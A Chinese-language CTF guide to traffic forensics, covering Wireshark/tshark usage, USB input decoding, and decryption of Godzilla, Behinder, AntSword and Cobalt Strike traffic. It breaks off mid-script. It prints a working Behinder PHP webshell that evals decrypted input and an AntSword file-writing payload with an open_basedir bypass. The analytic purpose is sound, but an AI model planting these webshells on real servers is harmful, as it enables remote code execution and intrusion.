# Misc-Network Traffic Analysis


**This is a Simple Guide for Network Traffic Analysis.** 

&lt;!--more--&gt;
拿到流量包后，第一件事就是可以先 `strings | grep flag{` 一下，说不定 flag 就直接出了

当然也可以使用`@凤二西`师傅的 `破空_flag查找工具3.5.exe` 来搜索 flag

## WireShark基础

刚刚接触流量分析的同学，看到`Wireshark`中密密麻麻的流量包和字段可能会感觉无从下手

但是其实我们要明白一点就是，流量分析的第一步就是过滤，把流量包过滤到我们能掌控的范围内，然后再逐个分析

`wireshark`的过滤器其实上手很简单，用熟悉了以后会给人一种非常顺手的感觉

常见的协议比如`http`，常用的有下面这些参数，其实只要在过滤器中输入`htt`. 它就会自动提示你后面的字段了

```
http.request.method == &#34;POST&#34;
http.request.full_uri == “XXX”
......
```

除了协议以外，还有一些比较常用的

```bash
# 包含什么内容的帧
frame contains &#34;XXX&#34;
```

其实这里可以直接右击想要过滤的字段，然后作为过滤器选中，上面就会自己跳出来过滤的表达式了（这里也可以使用或选中和且选中）

有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了

![](imgs/N1.png)

## tshark使用教程

导出流量包中所有POST数据包的data数据

```bash
tshark -r 1.pcapng -Y &#34;http.request.method == POST&#34; -T fields -e data.data &gt; data.txt
# -r：指定了需要读取的文件
# -Y：使用过滤器
# -T：表示仅仅输出所选字段
# -e：指定提取的字段
```

以下两个命令是Linux中的命令
```bash
# uinq：去除重复行
# sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）
```

在我们清楚了tshark的相关命令后，我们就可以尝试编写Python脚本来调用tshark进行流量包的处理了

这种用法通常在我们分析较大流量包并且需要频繁复制里面的数据的时候比较实用

```python
import json
import subprocess

output = &#34;&#34;
file_path = &#34;&#34; # 流量包的路径
command = [
	&#34;tshark&#34;,  # tshark的路径，如果在环境变量里这里就不用改
	&#39;-r&#39;, file_path,  # 读取指定的 pcapng 文件
	&#39;-Y&#39;, &#39;http&#39;,  # 过滤出 HTTP 数据包
	&#39;-T&#39;, &#39;json&#39;,  # 输出为 JSON 格式
	&#39;-e&#39;, &#39;http.request.method&#39;,  # 请求方法
	&#39;-e&#39;, &#39;http.host&#39;,  # 请求主机
	&#39;-e&#39;, &#39;http.request.uri&#39;,  # 请求 URI
	&#39;-e&#39;, &#39;http.user_agent&#39;,  # 用户代理
	&#39;-e&#39;, &#39;http.file_data&#39;,  # 请求中的文件数据（POST 请求的内容）
	&#39;-e&#39;, &#39;http.response.code&#39;,  # 响应代码
	&#39;-e&#39;, &#39;http.response.phrase&#39;,  # 响应短语
	&#39;-e&#39;, &#39;http.content_type&#39;  # 响应内容类型
]
result = subprocess.run(
    command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
json_output = json.loads(result.stdout)
# print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除

# 遍历 JSON 数据并提取字段
for packet in json_output:
    layers = packet.get(&#39;_source&#39;, {}).get(&#39;layers&#39;, {})
    request_method = layers.get(&#39;http.request.method&#39;, [&#39;None&#39;])[0]
    request_host = layers.get(&#39;http.host&#39;, [&#39;None&#39;])[0]
    request_uri = layers.get(&#39;http.request.uri&#39;, [&#39;None&#39;])[0]
    user_agent = layers.get(&#39;http.user_agent&#39;, [&#39;None&#39;])[0]
    file_data = layers.get(&#39;http.file_data&#39;, [&#39;None&#39;])[0]
    response_code = layers.get(&#39;http.response.code&#39;, [&#39;None&#39;])[0]
    response_phrase = layers.get(&#39;http.response.phrase&#39;, [&#39;None&#39;])[0]
    content_type = layers.get(&#39;http.content_type&#39;, [&#39;None&#39;])[0]
```

## 流量分析基础考点

### 1、直接搜索flag明文或者编码过的flag:

### 2、流量包端口隐写（可能会有01互换）

### 3、TCP/FTP协议传输文件(binwalk和foremost都没用)：

```
1. 直接用wireshark导出为pcap文件然后用networkminer分析
2. 拉入kali用tcpxtract提取文件：tcpxtract -f &#43;文件名.pcap
3. 直接追踪流提取16进制，根据文件头尾提取出文件
```

### 4、有时候可能需要根据IP或者版本分类导出

## USB流量分析

常见的类型有鼠标流量和键盘流量，当然有时候还会出现数位板这种设备的流量

流量包中数据存储的字段有两种：`usb.capdata` 和 `usbhid.data`

### 键盘流量分析

&gt; 键盘流量的数据常见的长度为8字节

首先根据数据存储的字段，用`tshark`提取出数据，注意在有多个IP的情况下要用过滤器分IP提取

```bash
tshark -r example.pcapng -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; data.txt
tshark -r example.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; data.txt

tshark -r example.pcapng -Y &#39;usb.src == &#34;2.3.1&#34;&#39; -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; data.txt
# -r：指定了需要读取的文件
# -Y：使用过滤器
# -T：表示仅仅输出所选字段
# -e：指定提取的字段
# sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）
```

然后使用脚本根据对照表还原出键盘输入的数据即可

&gt; Tips:网上的教程都是告诉大家需要对数据先添加冒号，但是现在新版的tshark很多情况下提取出来的数据是不带冒号的
&gt; 
&gt; 因此我个人觉得这里没必要多此一举，我们还是要与时俱进，简单改一下网上的脚本就行
&gt; 
&gt; 这里就贴一份的自己写的还原脚本吧

```python
normalKeys = {&#34;04&#34;: &#34;a&#34;, &#34;05&#34;: &#34;b&#34;, &#34;06&#34;: &#34;c&#34;, &#34;07&#34;: &#34;d&#34;, &#34;08&#34;: &#34;e&#34;, &#34;09&#34;: &#34;f&#34;, &#34;0a&#34;: &#34;g&#34;, &#34;0b&#34;: &#34;h&#34;, &#34;0c&#34;: &#34;i&#34;,
              &#34;0d&#34;: &#34;j&#34;, &#34;0e&#34;: &#34;k&#34;, &#34;0f&#34;: &#34;l&#34;, &#34;10&#34;: &#34;m&#34;, &#34;11&#34;: &#34;n&#34;, &#34;12&#34;: &#34;o&#34;, &#34;13&#34;: &#34;p&#34;, &#34;14&#34;: &#34;q&#34;, &#34;15&#34;: &#34;r&#34;,
              &#34;16&#34;: &#34;s&#34;, &#34;17&#34;: &#34;t&#34;, &#34;18&#34;: &#34;u&#34;, &#34;19&#34;: &#34;v&#34;, &#34;1a&#34;: &#34;w&#34;, &#34;1b&#34;: &#34;x&#34;, &#34;1c&#34;: &#34;y&#34;, &#34;1d&#34;: &#34;z&#34;, &#34;1e&#34;: &#34;1&#34;,
              &#34;1f&#34;: &#34;2&#34;, &#34;20&#34;: &#34;3&#34;, &#34;21&#34;: &#34;4&#34;, &#34;22&#34;: &#34;5&#34;, &#34;23&#34;: &#34;6&#34;, &#34;24&#34;: &#34;7&#34;, &#34;25&#34;: &#34;8&#34;, &#34;26&#34;: &#34;9&#34;, &#34;27&#34;: &#34;0&#34;,
              &#34;28&#34;: &#34;&lt;RET&gt;&#34;, &#34;29&#34;: &#34;&lt;ESC&gt;&#34;, &#34;2a&#34;: &#34;&lt;DEL&gt;&#34;, &#34;2b&#34;: &#34;\t&#34;, &#34;2c&#34;: &#34;&lt;SPACE&gt;&#34;, &#34;2d&#34;: &#34;-&#34;, &#34;2e&#34;: &#34;=&#34;, &#34;2f&#34;: &#34;[&#34;,
              &#34;30&#34;: &#34;]&#34;, &#34;31&#34;: &#34;\\&#34;, &#34;32&#34;: &#34;&lt;NON&gt;&#34;, &#34;33&#34;: &#34;;&#34;, &#34;34&#34;: &#34;&#39;&#34;, &#34;35&#34;: &#34;&lt;GA&gt;&#34;, &#34;36&#34;: &#34;,&#34;, &#34;37&#34;: &#34;.&#34;, &#34;38&#34;: &#34;/&#34;,
              &#34;39&#34;: &#34;&lt;CAP&gt;&#34;, &#34;3a&#34;: &#34;&lt;F1&gt;&#34;, &#34;3b&#34;: &#34;&lt;F2&gt;&#34;, &#34;3c&#34;: &#34;&lt;F3&gt;&#34;, &#34;3d&#34;: &#34;&lt;F4&gt;&#34;, &#34;3e&#34;: &#34;&lt;F5&gt;&#34;, &#34;3f&#34;: &#34;&lt;F6&gt;&#34;,
              &#34;40&#34;: &#34;&lt;F7&gt;&#34;, &#34;41&#34;: &#34;&lt;F8&gt;&#34;, &#34;42&#34;: &#34;&lt;F9&gt;&#34;, &#34;43&#34;: &#34;&lt;F10&gt;&#34;, &#34;44&#34;: &#34;&lt;F11&gt;&#34;, &#34;45&#34;: &#34;&lt;F12&gt;&#34;}

shiftKeys = {&#34;04&#34;: &#34;A&#34;, &#34;05&#34;: &#34;B&#34;, &#34;06&#34;: &#34;C&#34;, &#34;07&#34;: &#34;D&#34;, &#34;08&#34;: &#34;E&#34;, &#34;09&#34;: &#34;F&#34;,&#34;0a&#34;: &#34;G&#34;, &#34;0b&#34;: &#34;H&#34;, &#34;0c&#34;: &#34;I&#34;, 
             &#34;0d&#34;: &#34;J&#34;, &#34;0e&#34;: &#34;K&#34;, &#34;0f&#34;: &#34;L&#34;, &#34;10&#34;: &#34;M&#34;, &#34;11&#34;: &#34;N&#34;, &#34;12&#34;: &#34;O&#34;,&#34;13&#34;: &#34;P&#34;, &#34;14&#34;: &#34;Q&#34;, &#34;15&#34;: &#34;R&#34;,
             &#34;16&#34;: &#34;S&#34;, &#34;17&#34;: &#34;T&#34;, &#34;18&#34;: &#34;U&#34;, &#34;19&#34;: &#34;V&#34;, &#34;1a&#34;: &#34;W&#34;, &#34;1b&#34;: &#34;X&#34;,&#34;1c&#34;: &#34;Y&#34;, &#34;1d&#34;: &#34;Z&#34;, &#34;1e&#34;: &#34;!&#34;,
             &#34;1f&#34;: &#34;@&#34;, &#34;20&#34;: &#34;#&#34;, &#34;21&#34;: &#34;$&#34;, &#34;22&#34;: &#34;%&#34;, &#34;23&#34;: &#34;^&#34;, &#34;24&#34;: &#34;&amp;&#34;,&#34;25&#34;: &#34;*&#34;, &#34;26&#34;: &#34;(&#34;, &#34;27&#34;: &#34;)&#34;,
             &#34;28&#34;: &#34;&lt;RET&gt;&#34;, &#34;29&#34;: &#34;&lt;ESC&gt;&#34;, &#34;2a&#34;: &#34;&lt;DEL&gt;&#34;, &#34;2b&#34;: &#34;\t&#34;, &#34;2c&#34;: &#34;&lt; SPACE &gt; &#34;, &#34;2d&#34;: &#34;_&#34;, &#34;2e&#34;: &#34; &#43; &#34;,
             &#34;2f&#34;: &#34;{&#34;, &#34;30&#34;: &#34;}&#34;, &#34;31&#34;: &#34;|&#34;, &#34;32&#34;: &#34;&lt;NON&gt;&#34;, &#34;33&#34;: &#34;\&#34;&#34;, &#34;34&#34;: &#34;:&#34;, &#34;35&#34;:&#34;&lt;TILDE&gt;&#34;, &#34;36&#34;: &#34;&lt;&#34;, 
             &#34;37&#34;: &#34;&gt;&#34;, &#34;38&#34;: &#34;?&#34;,&#34;39&#34;: &#34;&lt;CAP&gt;&#34;, &#34;3a&#34;: &#34;&lt;F1&gt;&#34;, &#34;3b&#34;: &#34;&lt;F2&gt;&#34;, &#34;3c&#34;: &#34;&lt;F3&gt;&#34;, &#34;3d&#34;: &#34;&lt; F4 &gt; &#34;, 
             &#34;3e&#34;: &#34; &lt; F5 &gt; &#34;,&#34;3f&#34;: &#34; &lt; F6 &gt; &#34;,&#34;40&#34;: &#34;&lt;F7&gt;&#34;,&#34;41&#34;: &#34;&lt;F8&gt;&#34;, &#34;42&#34;: &#34;&lt;F9&gt;&#34;, &#34;43&#34;: &#34;&lt;F10&gt;&#34;, &#34;44&#34;: &#34;&lt; F11 &gt; &#34;, &#34;45&#34;: &#34; &lt; F12 &gt; &#34;}
output = []
delete_output = []
keys = open(&#39;data.txt&#39;)
for line in keys:
    try:
        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[2]!=&#39;0&#39; or line[3]!=&#39;0&#39; or line[6]!=&#39;0&#39; or line[7]!=&#39;0&#39; or line[8]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[11]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[14]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[4:6]==&#34;00&#34;:
             continue
        if line[4:6] in normalKeys.keys():
            if line[1] == &#39;2&#39;:
                output &#43;= [shiftKeys[line[4:6]]]
            else:
                output &#43;= [normalKeys[line[4:6]]]
        else:
            output &#43;= [&#39;[unknown]&#39;]
    except:
        pass
keys.close()

flag=0
for i in range(len(output)):
    try:
        if output[i] == &#34;&lt;CAP&gt;&#34;:
            flag = 1 - flag
        if flag != 0:
            output[i] = output[i].upper()
    except:
        pass

output = [x for x in output if x != &#39;&lt;CAP&gt;&#39;]

new_output = []
for i in range(len(output)):
    if output[i] == &#34;&lt;DEL&gt;&#34;:
        delete_output.append(output[i-1])
        new_output = new_output[:-1]
    else:
        new_output.append(output[i])
        
print(f&#39;[&#43;] 键盘输入的内容为：{&#34;&#34;.join(output)}&#39;)
print(f&#39;[&#43;] 键盘删除的内容为：{&#34;&#34;.join(delete_output)}&#39;)
print(f&#39;[&#43;] 最后的结果为：{&#34;&#34;.join(new_output)}&#39;)
```

然后有时候还会出现这样一种考点就是：出题人会把关键信息藏在被`&lt;DEL&gt;`的字符中

因此我们需要把被删除的字符也还原出来


### 鼠标流量

&gt; 键盘流量的数据常见的长度为4字节、6字节、7字节、8字节

和键盘流量的过程一样，第一步都是先用tshark提取出数据

```bash
tshark -r example.pcapng -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; data.txt
tshark -r example.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; data.txt

tshark -r example.pcapng -Y &#39;usb.src == &#34;2.3.1&#34;&#39; -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; data.txt
# -r：指定了需要读取的文件
# -Y：使用过滤器
# -T：表示仅仅输出所选字段
# -e：指定提取的字段
# sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）
```

然后和网上那些教程不同，我这里就自己改了一下脚本，就不用多此一举给数据添加冒号了

```python
import matplotlib.pyplot as plt
import numpy as np  

def get_XY():
    out = &#34;&#34;
    posx = 0
    posy = 0
    with open(&#34;data.txt&#34;,&#39;r&#39;) as f:
        data = f.read().split()
        for line in data:
            if len(line) == 8:
                flag = int(line[0:2],16) # 1-左键 2-右键 0-nothing
                x = int(line[2:4],16)
                y = int(line[4:6],16)
            elif len(line) == 12:
                flag = int(line[2:4],16) # 1-左键 2-右键 0-nothing
                x = int(line[4:6],16)
                y = int(line[6:8],16)
            elif len(line) == 14:
                flag = int(line[2:4],16) # 1-左键 2-右键 0-nothing
                x = int(line[4:6],16)
                y = int(line[6:8],16)
            elif len(line) == 16:
                flag = int(line[2:4],16) # 1-左键 2-右键 0-nothing
                x = int(line[4:6],16)
                y = int(line[8:10],16)
            
            # 鼠标的移动数据通常是以有符号8位整数的形式存储的，范围是 -128 到 127
            if x &gt; 127:
                x -= 256
            if y &gt; 127:
                y -= 256
            # 累加距离，算出鼠标当前所在的位置
            posx &#43;= x
            posy &#43;= y
            # 查看鼠标左键/右键/nothing的轨迹
            # if flag == 0:
            # if flag == 1:
            if flag == 2:
                out &#43;= str(posx) &#43; &#39; &#39; &#43; str(posy) &#43; &#39;\n&#39;
    with open(&#34;xy.txt&#34;,&#34;w&#34;) as f:
        f.write(out)

def plot():
    # unpack=True将每列数据分别存储到一个数组中
    x,y = np.loadtxt(&#34;xy.txt&#34;,delimiter=&#39; &#39;,unpack=True)
    plt.plot(x, -y, &#39;.&#39;)
    plt.show()
    
if __name__ == &#34;__main__&#34;:
    get_XY()
    plot()
```


### 数位板流量分析：

[例题1-2022浙江省赛决赛-hard_Digital_plate](https://goodlunatic.github.io/posts/3f7db4e/#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-hard_digital_plate)

例题2-RoarCTF MISC Davinci_Cipher

```bash
# 先导出数据并去除空行
tshark -r hard_Digital_plate.pcapng -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; out.txt
# -r 指定了需要读取的文件
# -T 表示仅仅输出所选字段
# -e 指定提取的字段
# 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）
```

类似于：

```
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08813708951e650000000000
08813808951ec10000000000
08813908951e2e0100000000
08813a08951e940100000000
08813b08951ee20100000000
08813c08951e1c0200000000
08813c08951e440200000000
08813c08951e610200000000
```

需要我们根据设备的传输协议来分析出对应的xy坐标以及压感数据

```python
import matplotlib.pyplot as plt

with open(&#34;data.txt&#34;,&#34;r&#34;) as f:
    lines = f.read().split()
    
def draw_pic1():
    x = []
    y = []
    for line in lines:
        if(int(line[12:16],16) != 0):
            x.append(int(line[6:8],16) &lt;&lt; 8 | int(line[4:6],16))
            y.append(-1 * (int(line[10:12],16) &lt;&lt; 8 | int(line[8:10],16)))
    
    plt.plot(x,y,&#39;.&#39;)
    plt.show()

def draw_pic2():
    x = []
    y = []
    press_lst = []
    for line in lines:
        if(int(line[12:16],16) != 0):
            press_data = int(line[12:16],16)
            press_lst.append(press_data)
            if(press_data &lt; 65000):
                x.append(int(line[6:8],16) &lt;&lt; 8 | int(line[4:6],16))
                y.append(-1 * (int(line[10:12],16) &lt;&lt; 8 | int(line[8:10],16)))
            
    plt.plot(x,y,&#39;.&#39;)
    plt.show()

if __name__ == &#34;__main__&#34;:
    draw_pic1()
    # draw_pic2()
```

## SQL注入流量分析

可以使用 wireshark 的过滤器过滤出注入的流量，然后导出特定分组

然后使用 tshark 根据字段名提取出所有的注入语句

如果是盲注的话，直接写个正则匹配脚本提取数据即可

例题1-2023 铁三 traffic

## Webshell流量分析

Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzip的文件头是`1F 8B 08 00`

### 菜刀流量分析

菜刀流量的一个明显的特征就是，响应里可能有 `-&gt;|      |&lt;-` 这样的字符串

![](imgs/image-20250419164405745.png)

流量分析和解密上没啥难度，一般就是简单的明文流量或者就Base64编码了一下

### 哥斯拉流量分析

&gt; 哥斯拉的默认密钥为：3c6e0b8a9c15224a

哥斯拉流量一般的加密方式就是异或，当然在插件的加持下可能也会用到AES

然后如果是异或的话，编码器的函数如下所示，就是这里要注意把密钥的最后一位放到最后

```php
function encode($D,$K){
    for($i=0;$i&lt;strlen($D);$i&#43;&#43;) {
        $c = $K[$i&#43;1&amp;15]; // 要注意把密钥的最后一位放到最后
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
```

#### php_xor_raw

传输的数据类似于下图这种

![](imgs/image-20250226141615204.png)

因此我们直接对照着加密逻辑，CyberChef解密请求和响应即可（当然这里也可以写个脚本批量解）

![](imgs/image-20250226141953586.png)


![](imgs/image-20250226142116762.png)

#### php_xor_base64

![](imgs/image-20250226142501601.png)

加密逻辑和上面的一样，就是多了一个URL解码和Base64解码的过程

![](imgs/image-20250226142239379.png)

然后响应的数据头尾会输出`md5(pass.key)`的前十六位和后十六位，解密的时候删去即可

```php
echo substr(md5($pass.$key),0,16);
echo base64_encode(encode(@run($data),$key));
echo substr(md5($pass.$key),16);
```

![](imgs/image-20250226142441765.png)

#### php_eval_xor_base64

![](imgs/image-20250226142732540.png)

这种情况下前面的数据`URL解码&#43;reverse&#43;Base64解码`后可以得到加密的key

然后执行的命令在第二个参数中，就是上图中的`babyshell`

剩下的步骤就和之前一样了

![](imgs/image-20250226143409529.png)

![](imgs/image-20250226143429376.png)

### 冰蝎流量分析

&gt; 冰蝎的默认密钥为：e45e329feb5d925b（md5(rebeyond)的前16位）
&gt; 
&gt; ！！当找不到密钥或者密钥未知的时候可以尝试直接用默认密钥解密试一下！！

或者也可以尝试用`PuzzleSolver`爆破一下密钥

![](imgs/image-20250424172707884.png)

冰蝎流量的加密方式主要包括异或和AES，异或加密的话是和哥斯拉一样的

具体的加密代码如下所示：

```php
&lt;?php
@error_reporting(0);
session_start();
	// $key=&#34;e45e329feb5d925b&#34;; // 默认密钥
    $key=&#34;5b4582c9d56b5b33&#34;;
	$_SESSION[&#39;k&#39;]=$key;
	$post=file_get_contents(&#34;php://input&#34;);
	if(!extension_loaded(&#39;openssl&#39;))
	{
		$t=&#34;base64_&#34;.&#34;decode&#34;;
		$post=$t($post.&#34;&#34;);
		
		for($i=0;$i&lt;strlen($post);$i&#43;&#43;) {
    			 $post[$i] = $post[$i]^$key[$i&#43;1&amp;15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, &#34;AES128&#34;, $key);
	}
    $arr=explode(&#39;|&#39;,$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p.&#34;&#34;);}}
    @call_user_func(new C(),$params);
?&gt;
```

#### XOR_base64

异或的情况和哥斯拉的有点像，把密钥的第一位放到最后一位然后解密即可

![](imgs/image-20250419164124175.png)

#### AES_base64

当加密器用的是AES加密的时候就需要注意了

可能会有两种情况，一种是AES-ECB（没有IV），一种是AES-CBC（有IV）

然后这里如果有IV，IV也可能有以下两种情况

```
IV = 0123456789abcdef
IV = \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
```

反正不管是哪种加密，都可以用CyberChef试一试，看看哪一种可以正常解出来就行

![](imgs/N3.png)

![](imgs/N4.png)

当然，这里如果想要偷懒，对于冰蝎和哥斯拉流量也可以用`@风二西`师傅的`承影_哥斯拉冰蝎解码工具`辅助解密

直接将木马中的密钥复制到工具中，然后 Ctrl&#43;A 全选加密的数据，再右键选择对应的解密方式即可

![](imgs/N5.png)

最后，如果遇到数据量比较庞大的流量分析的时候，可能会需要用到脚本解密批量的情况

这里我就放几个比较简单的解密脚本

```python
# XOR
import base64
key = &#34;e45e329feb5d925b&#34;

def decrypt_xor(ciphertext_base64):
    ciphertext = base64.b64decode(ciphertext_base64)
    key_stream = (key[(i&#43;1)%len(key)] for i in range(len(ciphertext)))
    decrypted = bytes([a ^ ord(b) for a, b in zip(ciphertext, key_stream)])
    return decrypted
```

```python
# AES-CBC
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

key = &#34;5b4582c9d56b5b33&#34;
key = key.encode(&#39;utf-8&#39;).ljust(16, b&#39;\x00&#39;)  # 默认填充到16字节(AES-128)
iv = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;

def decrypt_aes_cbc(ciphertext_base64):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = base64.b64decode(ciphertext_base64)
    decrypted = cipher.decrypt(ciphertext)
    return decrypted
```

### 蚁剑流量分析

蚁剑流量因为支持多种编码器，然后Github上也有很多[开源的编码器]()

&gt; 1、 https://github.com/lowliness9/AntSwordEncoder
&gt; 
&gt; 2、 https://github.com/AntSwordProject/AwesomeEncoder

因此流量的分析和解密上就会稍微复杂一点

这里我稍微写一下蚁剑流量分析需要注意的地方：

1、路径base64字符串需要去除前两个字符后再解码

2、响应数据的头尾有额外的字符，需要先去除然后再base64解码

```php
// 蚁剑webshell一个比较简单的例子
&lt;?php
// 设置一些PHP配置
@ini_set(&#34;display_errors&#34;, &#34;0&#34;); // 关闭显示错误信息
@set_time_limit(0); // 设置脚本执行时间为无限制
// 获取open_basedir配置
$opdir = @ini_get(&#34;open_basedir&#34;);
// 如果open_basedir配置存在
if ($opdir) {
    // 获取当前脚本所在目录
    $ocwd = dirname($_SERVER[&#34;SCRIPT_FILENAME&#34;]);
    // 将open_basedir路径分割成数组
    // /;|:/
    $oparr = preg_split(base64_decode(&#34;Lzt8Oi8=&#34;), $opdir);
    // 将当前目录和系统临时目录添加到数组中
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    // 遍历open_basedir数组
    foreach ($oparr as $item) {
        // 如果目录不可写，继续下一个目录
        if (!@is_writable($item)) {
            continue;
        }
        // 创建一个临时目录
        $tmdir = $item . &#34;/.573ef8c9dd12&#34;;
        @mkdir($tmdir);
        // 如果目录创建失败，继续下一个目录
        if (!@file_exists($tmdir)) {
            continue;
        }
        // 获取临时目录的真实路径
        $tmdir = realpath($tmdir);
        // 切换到临时目录
        @chdir($tmdir);
        // 修改open_basedir配置，使其可以访问上层目录
        @ini_set(&#34;open_basedir&#34;, &#34;..&#34;);
        // 获取目录路径的数组
        $cntarr = @preg_split(&#34;/\\\\|\//&#34;, $tmdir);
        // 逐级返回上层目录，以还原open_basedir配置
        for ($i = 0; $i &lt; sizeof($cntarr); $i&#43;&#43;) {
            @chdir(&#34;..&#34;);
        }
        // 恢复open_basedir配置为根目录
        @ini_set(&#34;open_basedir&#34;, &#34;/&#34;);
        // 删除临时目录
        @rmdir($tmdir);
        // 跳出循环，只操作第一个可写目录
        break;
    }
}
// 自定义函数，对输出进行base64编码
function asenc($out)
{
    return @base64_encode($out);
}
// 自定义函数，获取输出缓冲区内容并进行处理
function asoutput()
{
    $output = ob_get_contents(); // 获取输出缓冲区内容
    ob_end_clean(); // 清空输出缓冲区
    // 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
    echo &#34;fb708664&#34;;
    echo @asenc($output);
    echo &#34;870b983ed5&#34;;
}
// 开始输出缓冲区
ob_start();
try {
    // 解码POST请求中的文件路径和内容
    // 从这个变量的值中取出从第二个字符开始到最后的子字符串，蚁剑需要去除前两个字母的原因所在
    $f = base64_decode(substr($_POST[&#34;idb82191cedb24&#34;], 2));
    $c = $_POST[&#34;e748c4dcd196bb&#34;];
    $c = str_replace(&#34;\r&#34;, &#34;&#34;, $c);
    $c = str_replace(&#34;\n&#34;, &#34;&#34;, $c);
    $buf = &#34;&#34;;
    // 将内容进行URL解码
    for ($i = 0; $i &lt; strlen($c); $i &#43;= 2) {
        $buf .= urldecode(&#34;%&#34; . substr($c, $i, 2));
    }
    // 将解码后的内容写入文件，并返回结果
    echo (@fwrite(fopen($f, &#34;a&#34;), $buf) ? &#34;1&#34; : &#34;0&#34;);
} catch (Exception $e) {
    // 如果发生异常，输出错误信息
    echo &#34;ERROR://&#34; . $e-&gt;getMessage();
}
// 调用自定义函数处理输出
asoutput();
// 终止脚本执行
die();
?&gt;
```

这里总结一下我手动分析蚁剑流量的步骤：

1、首先url解码请求包，然后base64解码其中的php文件和该文件执行的命令

2、找到php文件中asoutput函数的标识字符串

```php
function asoutput()
{
    $output = ob_get_contents(); // 获取输出缓冲区内容
    ob_end_clean(); // 清空输出缓冲区
    // 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
    echo &#34;fb708664&#34;;
    echo @asenc($output);
    echo &#34;870b983ed5&#34;;
}
```

3、根据gzip的文件头提取响应包，去除标识字符串后base64解码得到响应数据

4、按照上面的步骤逐个分析流量包

### CobalStrike流量分析

&gt; 参考链接：https://5ime.cn/cobaltstrike-decrypt.html

#### 密钥对文件的情况

先从流量包中导出key文件

然后在 cs-scripts中运行 python3 parse_beacon_keys.py 得到私钥

```
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT&#43;pVELCnX1r
To4LhSzcP7sPOrIOQg0onSpKO1tzOVX&#43;2DqtZsSFoFrAmrEV&#43;gZCbFfhYR9vs5DGLUg9aa0i5Gqh
Pz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN&#43;wOYZEorInV9gPkCJdAgMBAAEC
gYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5V
r7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ&#43;rYnCezQcrt4V3c7BZtW9RjFW
vHh09PF808Yl4/&#43;&#43;&#43;vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL
3MK&#43;EtafnYIDD1IS&#43;97K0cbg922RKXNdv&#43;kCQQDWJk0kNe8ePBpwJU4slig1Y&#43;4VWuwTRz6r&#43;MNp
v&#43;WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG
9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB&#43;aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3C
dsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJB
AIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2
ddsyNI6XbCU=
-----END PRIVATE KEY-----
```

在数据包的HTTP请求中获得Cookie，然后修改CS_Decrypt中的 Beacon_metadata_RSA_Decrypt.py 的私钥和Cookie

运行即可得到 AES和HMAC key

```
AES key:ef08974c0b06bd5127e04ceffe12597b
HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9
```

然后把这两个key填入 Beacon_Task_return_AES_Decrypt.py 中

把流量包中的POST数据包中的data的值用CyberChef (from hex&#43;to base64) 处理后得到的数据填入上面那个脚本中

一个个解密每个POST数据包中的data即可得到flag

我把上面的步骤整合成了下面一个脚本

```python
import base64
import javaobj.v2 as javaobj
import hashlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import hexdump
import hmac
import binascii
from Crypto.Cipher import AES


def format_key(key_data, key_type):
    key_data = bytes(map(lambda x: x &amp; 0xFF, key_data))
    formatted_key = f&#34;-----BEGIN {key_type} KEY-----\n&#34;
